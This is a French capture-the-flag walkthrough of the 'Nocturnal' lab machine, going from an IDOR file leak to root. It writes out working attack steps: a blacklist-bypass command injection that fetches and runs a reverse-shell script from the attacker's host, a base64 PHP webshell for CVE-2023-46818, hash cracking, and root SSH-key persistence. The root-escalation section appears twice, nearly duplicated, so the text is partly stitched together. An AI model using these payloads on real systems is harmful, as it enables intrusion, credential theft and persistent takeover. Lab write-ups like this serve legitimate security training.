![Cover](cover.png)

### 1. Scanning & Énumération

La phase de reconnaissance commence par un scan **Nmap** complet pour identifier les vecteurs d'attaque potentiels.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.64

# Scan de services détaillé
nmap -p 22,80 -sCV 10.10.11.64
```

Le scan révèle deux ports ouverts :
*   **22/tcp (SSH)** : OpenSSH 8.2p1.
*   **80/tcp (HTTP)** : Nginx 1.18.0, redirigeant vers `http://nocturnal.htb/`.

J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts` :
```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

L'énumération des répertoires avec **feroxbuster** met en évidence une structure **PHP** classique et plusieurs points d'entrée intéressants :

```bash
feroxbuster -u http://nocturnal.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Résultats notables :
*   `/login.php` & `/register.php` : Gestion des comptes.
*   `/dashboard.php` : Interface utilisateur après authentification.
*   `/view.php` : Script de visualisation/téléchargement de fichiers.
*   `/admin.php` : Panel administratif (redirection vers login si non-admin).
*   `/backups/` : Répertoire protégé (403 Forbidden).

---

### 2. Identification de l'IDOR & Fuite de données

En explorant les fonctionnalités utilisateur, je remarque que l'application permet d'uploader des fichiers (limités aux extensions `.doc`, `.odt`, etc.) et de les visualiser via `view.php`.

L'URL de visualisation suit ce format : `view.php?username=0xdf&file=document.doc`.

> **Schéma Mental : Insecure Direct Object Reference (IDOR)**
> L'application utilise deux paramètres (`username` et `file`) pour localiser un fichier sur le disque. Si le backend ne vérifie pas que le `username` dans l'URL correspond à l'utilisateur authentifié en session, je peux accéder aux fichiers de n'importe quel utilisateur.

En testant des noms d'utilisateurs aléatoires, je confirme une **User Enumeration** : l'application répond "User not found" si l'utilisateur n'existe pas. J'utilise **ffuf** pour identifier les utilisateurs valides via ce paramètre.

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' \
     -b 'PHPSESSID=<MY_SESSION_ID>' \
     -w /usr/share/seclists/Usernames/Names/names.txt \
     -fr 'User not found'
```

Utilisateurs identifiés : `admin`, `amanda`, `tobias`.

En interrogeant les fichiers de l'utilisateur `amanda`, je découvre un fichier nommé `privacy.odt`.
URL : `http://nocturnal.htb/view.php?username=amanda&file=privacy.odt`

Le document contient un mot de passe temporaire : **arHkG7HAI68X8s1J**. Ce mot de passe me permet de me connecter en tant qu'**amanda** sur le portail web.

---

### 3. Exploitation du Command Injection (RCE)

Une fois connecté en tant qu'**amanda**, j'accède à `/admin.php`. Cette page propose un utilitaire de sauvegarde qui demande un mot de passe pour chiffrer l'archive **ZIP**.

L'analyse du code source (récupéré via la sauvegarde elle-même) montre que l'entrée utilisateur est passée à la fonction `proc_open` après un filtrage via `cleanEntry`.

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
    // ... filtrage ...
}
```

La **Blacklist** est incomplète. Elle oublie le caractère **Newline** (`\n` ou `%0a`) et le caractère **Tab** (`\t` ou `%09`). Sous Linux, un saut de ligne dans un shell permet d'exécuter une nouvelle commande, et la tabulation peut remplacer l'espace pour séparer les arguments.

> **Schéma Mental : Bypass de Blacklist Shell**
> 1. La commande initiale est : `zip -r -P [PASSWORD] backup.zip .`
> 2. Injection : `[PASSWORD]%0a[COMMAND]%0a`
> 3. Résultat : Le shell exécute le zip, puis ma commande sur une nouvelle ligne.
> 4. Contrainte : Pas d'espaces autorisés -> Utilisation de `%09` (Tab).

#### Payload de Reverse Shell :
Comme le caractère `&` est filtré, je ne peux pas utiliser un one-liner Bash classique. Je vais donc télécharger un script shell depuis ma machine d'attaque.

1.  **Préparation du script (`rev.sh`)** :
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

2.  **Injection via le paramètre `password` dans la requête POST** :
```http
password=0xdf%0acurl%09http://10.10.14.6/rev.sh%09-o%09/tmp/rev.sh%0abash%09/tmp/rev.sh
```

En soumettant ce formulaire, le serveur exécute séquentiellement :
1.  La commande `zip` (qui échoue ou s'exécute partiellement).
2.  `curl http://10.10.14.6/rev.sh -o /tmp/rev.sh` (Téléchargement).
3.  `bash /tmp/rev.sh` (Exécution).

Je reçois une connexion sur mon listener :
```bash
nc -lnvp 443
# Connection received on 10.10.11.64
www-data@nocturnal:~/nocturnal.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le premier accès est établi en tant que **www-data**.

---

### Énumération Interne & Post-Exploitation

Une fois mon accès **www-data** stabilisé, je procède à une énumération du système pour identifier des vecteurs de mouvement latéral. L'inspection des répertoires web révèle une base de données **SQLite3** hors du **Document Root** classique.

```bash
# Identification des utilisateurs avec un shell valide
cat /etc/passwd | grep 'sh$'

# Exploration de la base de données
sqlite3 /var/www/nocturnal_database/nocturnal_database.db
sqlite> .tables
sqlite> select * from users;
```

La table `users` contient des hashes **MD5**. Le hash de l'utilisateur **tobias** (`55c82b1ccd55ab219b3b109b07d5061d`) est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `slowmotionapocalypse`.

> **Schéma Mental :**
> Accès initial (`www-data`) -> Énumération du système de fichiers -> Extraction de base de données locale -> **Credential Dumping** (Hashes MD5) -> **Cracking** hors-ligne -> Pivot vers l'utilisateur système.

### Mouvement Latéral : Pivot vers Tobias

Le mot de passe récupéré est valide pour une session **SSH**, ce qui me permet d'obtenir un shell plus stable et de récupérer le premier flag (`user.txt`).

```bash
ssh tobias@nocturnal.htb
# Password: slowmotionapocalypse
cat /home/tobias/user.txt
```

### Escalade de Privilèges : De Tobias à Root

L'énumération des services locaux via `netstat` ou `ss` montre un service écoutant sur le port **127.0.0.1:8080**. L'analyse des processus confirme qu'une instance de **PHP** (serveur intégré) tourne avec les privilèges **root** dans le répertoire `/var/www/ispconfig`.

```bash
# Vérification des ports en écoute
netstat -tnl
# Identification du processus root
ps auxww | grep 8080
```

#### Tunneling & Accès à ISPConfig
Puisque le port 8080 n'est accessible que localement, j'utilise le **Local Port Forwarding** via **SSH** pour y accéder depuis ma machine d'attaque.

```bash
ssh -L 9001:localhost:8080 tobias@nocturnal.htb
```

En naviguant sur `http://127.0.0.1:9001`, je découvre l'interface **ISPConfig 3.2**. Les identifiants de **tobias** (`admin` / `slowmotionapocalypse`) fonctionnent sur ce panel administratif.

#### Exploitation de la CVE-2023-46818
Cette version est vulnérable à une **PHP Code Injection** dans l'éditeur de langue (`/admin/language_edit.php`). L'attaque consiste à injecter du code PHP arbitraire dans les fichiers de traduction, qui sont ensuite inclus et exécutés par le serveur.

> **Schéma Mental :**
> Service local root (ISPConfig) -> **SSH Tunneling** -> Authentification Admin -> **PHP Code Injection** (CVE-2023-46818) -> Écriture d'un **Webshell** dans un répertoire accessible -> Exécution de commandes en tant que **root**.

#### Exploitation Manuelle (POC)
L'injection nécessite de contourner les protections **CSRF**. Je crée un nouveau fichier de langue, récupère les jetons CSRF (`csrf_id` et `csrf_key`), puis j'injecte une charge utile via le paramètre `records[]`.

```http
POST /admin/language_edit.php HTTP/1.1
...
records[\]=PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K&csrf_id=...&csrf_key=...
```
*Note : La charge utile est un webshell encodé en Base64 pour éviter les problèmes de caractères spéciaux.*

#### Exploitation Automatisée
Un script Python peut automatiser le processus : authentification, récupération des tokens, injection du webshell et interaction.

```bash
# Utilisation d'un exploit public pour la CVE-2023-46818
python3 exploit_ispconfig.py http://localhost:9001 admin slowmotionapocalypse

# Une fois le webshell en place, stabilisation via SSH
echo "ssh-ed25519 AAAAC3... root@attackbox" > /root/.ssh/authorized_keys
ssh root@nocturnal.htb
```

L'exécution de `id` confirme l'accès **uid=0(root)**. Le flag final se trouve dans `/root/root.txt`.

---

### Élévation de Privilèges : De Tobias à Root

Une fois le shell obtenu en tant que **tobias**, l'énumération locale révèle des services écoutant uniquement sur l'interface de loopback. L'utilisation de `netstat -tnl` confirme la présence d'un service sur le port **8080/TCP**.

```bash
# Vérification des ports en écoute
netstat -tnl
# Identification du processus lié au port 8080
ps auxww | grep 8080
# Résultat : /usr/bin/php -S 127.0.0.1:8080 (exécuté par root)
```

Le processus est une instance de **PHP Development Server** tournant avec les privilèges **root**. Pour interagir avec ce service depuis ma machine d'attaque, je mets en place un **Local Port Forwarding** via **SSH**.

```bash
# Tunneling SSH pour accéder à l'interface d'administration
ssh -L 9001:localhost:8080 tobias@nocturnal.htb
```

En naviguant sur `http://127.0.0.1:9001`, je tombe sur une mire de connexion **ISPConfig 3.2**. Par réflexe de **Password Reuse**, je teste les identifiants de **tobias** pour le compte `admin`. La connexion réussit, me donnant accès au dashboard d'administration.

#### Exploitation de la CVE-2023-46818 (PHP Code Injection)

L'instance **ISPConfig** (version < 3.2.11p1) est vulnérable à une **PHP Code Injection** au niveau de l'éditeur de fichiers de langue (**Language File Editor**). Cette vulnérabilité permet à un administrateur d'injecter du code arbitraire dans les fichiers `.lng` si l'option `admin_allow_langedit` est active.

> **Schéma Mental :**
> Accès Local (Port 8080) -> SSH Tunneling -> Authentification ISPConfig (Password Reuse) -> Injection de code PHP via l'éditeur de langue -> RCE avec privilèges Root (car le serveur PHP tourne en root).

Bien qu'une exploitation manuelle soit possible en interceptant les **CSRF Tokens** et en injectant des payloads dans le paramètre `records[]`, l'utilisation d'un exploit public en Python s'avère plus efficace pour stabiliser l'accès.

```python
# Utilisation de l'exploit pour obtenir un webshell
uv run cve-2023-46818.py http://localhost:9001 admin slowmotionapocalypse

# Une fois le shell obtenu, vérification des privilèges
id
# uid=0(root) gid=0(root) groups=0(root)
```

Pour garantir une persistance stable et éviter les limitations du webshell, j'injecte ma clé publique SSH dans le fichier `authorized_keys` de l'utilisateur **root**.

```bash
# Persistance SSH
echo "ssh-ed25519 AAAAC3Nza...[snip]... user@attackbox" > /root/.ssh/authorized_keys
ssh -i id_rsa root@nocturnal.htb
```

---

### Analyse Post-Exploitation : "Beyond Root"

L'analyse du vecteur d'entrée initial révèle une particularité intéressante concernant la fonctionnalité de téléchargement de fichiers (`view.php`), qui a été patchée peu après la sortie de la machine.

#### Le problème du "Wrapped HTML"
Initialement, le script `view.php` ne se contentait pas de servir le fichier brut. Il encapsulait le contenu binaire (comme un fichier `.odt`) à l'intérieur d'une structure **HTML**. Le serveur envoyait un header `Content-Type: application/octet-stream`, mais le corps de la réponse contenait des balises `<html>` et `<body>` entourant les données binaires.

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="privacy.odt"

<!DOCTYPE html>
<html>... [HTML CONTENT] ... PK [BINARY DATA] ...</html>
```

#### Techniques de récupération de fichiers corrompus
Pour extraire le fichier **Amanda** (`privacy.odt`) malgré cette corruption, plusieurs approches étaient possibles :

1.  **Extraction Manuelle :** Utiliser un éditeur hexadécimal ou `vim` pour supprimer tous les octets précédant les **Magic Bytes** du format ZIP (`PK` ou `50 4B 03 04`), qui structurent les fichiers OpenDocument.
2.  **Tolérance aux pannes de ZIP :** Le format ZIP permet souvent de récupérer des données même si des octets superflus sont présents en début de fichier. La commande `unzip` ignore généralement le "garbage" initial.
3.  **Office Recovery :** Les suites bureautiques comme LibreOffice ou Word détectent la structure XML interne et proposent une réparation automatique du document en ignorant les balises HTML externes.

Cette phase démontre l'importance de comprendre les structures de fichiers binaires lors de l'exploitation de vulnérabilités de type **Insecure Direct Object Reference (IDOR)** ou **File Leak**, où le transport des données peut altérer l'intégrité du payload.